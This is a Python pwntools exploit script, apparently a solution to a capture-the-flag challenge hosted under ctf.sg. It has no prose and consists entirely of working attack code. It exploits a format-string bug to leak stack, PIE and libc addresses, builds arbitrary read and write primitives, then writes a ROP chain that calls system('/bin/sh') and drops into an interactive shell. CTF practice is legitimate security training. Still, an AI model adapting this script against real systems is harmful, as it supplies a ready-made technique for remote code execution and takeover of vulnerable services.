from pwn import *

r = remote("fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg", 42000)
r.recvuntil("Implemented\n")

def f(s):
        sleep(0.1)
        r.sendline(s+"_END_")
        return r.recvuntil("_END_", drop=True)

# Stack reference
stack_leak = int(f("%84$p"), 16)-1-8*88
log.info("stack_leak: {:#x}".format(stack_leak))

def p2i(ptr):
        delta = ptr - stack_leak
        return delta//8

_cursor = int(f("%39$p"), 16)
def cursor(ptr):
        global _cursor
        delta = _cursor ^ ptr
        if delta > 0xffff:
                log.error("Bad ASLR")
                exit()
        if delta > 0xff:
                payload = "%{}c".format(ptr & 0xffff)
                payload+= "%11$hn"
        else:
                payload = "%{}c".format(ptr & 0xff)
                payload+= "%11$hhn"
        f(payload)
        _cursor = ptr

_cursor2 = 0
def cursor2(ptr):
        global _cursor2
        ptr_base = stack_leak+(40-1)*8
        delta = _cursor2 ^ ptr
        i = 0
        while delta:
                cursor(ptr_base+i)
                payload = "%{}c".format(ptr & 0xffff)
                payload+= "%39$hn"
                f(payload)
                ptr >>= 16; delta >>= 16; i+=2
        _cursor2 = ptr

def arb_read(ptr):
        cursor2(ptr)
        return f("%40$s")

def arb_write(ptr, data):
        while data:
                cursor2(ptr)
                f("%{}c%40$n".format(data & 0xffff))
                data >>= 16
                ptr+=2

# PIE reference
pie_leak = int(f("%66$p"), 16)

# Do stuff
d = DynELF(arb_read, pie_leak)
pie_base = d.libbase
log.info("pie_base: {:#x}".format(pie_base))

# Libc leak
libc_base = u64(arb_read(pie_base+0x3fb8).ljust(8, '\x00'))-0x064e10
log.info("libc_base: {:#x}".format(libc_base))
system = libc_base + 0x055410
log.info("system: {:#x}".format(system))
data = 0

# Win
arb_write(stack_leak+(int(9)-1)*8, pie_base+0x133c)
arb_write(stack_leak+(int(14)-1)*8, pie_base+0x1343) # pop rdi
arb_write(stack_leak+(int(15)-1)*8, pie_base+0x40a0+len("exit\x00")) # binsh
arb_write(stack_leak+(int(16)-1)*8, system) # system
log.info("Trying to win")
sleep(0.1)
r.sendline("exit\x00/bin/sh\x00")

r.interactive()